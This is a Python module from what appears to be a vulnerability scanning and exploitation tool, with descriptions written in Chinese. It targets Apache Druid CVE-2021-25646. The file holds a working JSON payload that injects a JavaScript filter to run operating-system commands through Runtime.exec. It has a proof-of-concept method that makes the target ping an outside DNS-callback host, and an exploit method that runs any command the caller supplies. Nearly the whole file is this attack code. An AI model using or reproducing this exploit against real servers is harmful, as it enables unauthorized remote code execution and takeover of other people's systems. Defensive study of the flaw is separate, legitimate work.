#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from thirdparty import requests
from thirdparty.requests.compat import urljoin
import threading
from core.verify import verify
from module import globals
from module.api.dns import dns_result, dns_request
from thirdparty.requests_toolbelt.utils import dump


class ApacheDruid():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.ceye_domain = globals.get_value("ceye_domain")
        self.ceye_token = globals.get_value("ceye_token")
        self.ceye_api = globals.get_value("ceye_api")
        self.threadLock = threading.Lock()
        self.payload_cve_2021_25646 = r'''{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": "true"}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('RECOMMAND')}", "": {"enabled": "true"}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
            '''

    def cve_2021_25646_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Druid: CVE-2021-25646"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Apache Druid 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2021-25646"
        self.vul_info["vul_apps"] = "Druid"
        self.vul_info["vul_date"] = "2021-02-01"
        self.vul_info["vul_vers"] = "< 0.20.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。" \
                                    "此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，" \
                                    "经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。" \
                                    "攻击者可直接构造恶意请求执行任意代码，控制服务器。"
        self.vul_info["cre_date"] = "2021-02-03"
        self.vul_info["cre_auth"] = "zhzyker"
        url = urljoin(self.url, "/druid/indexer/v1/sampler")
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': self.ua,
            'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
            'Connection': 'keep-alive'
        }
        md = dns_request()
        cmd = "ping " + md
        data = self.payload_cve_2021_25646.replace("RECOMMAND", cmd)
        try:
            request = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            if dns_result(md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["vul_payd"] = data
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[dns] [rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_25646_exp(self, cmd):
        vul_name = "Apache Druid: CVE-2021-25646"
        url = urljoin(self.url, "/druid/indexer/v1/sampler")
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': self.ua,
            'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
            'Connection': 'keep-alive'
        }
        data = self.payload_cve_2021_25646.replace("RECOMMAND", cmd)
        try:
            request = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            r = "Command Executed Successfully (But No Echo)"
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
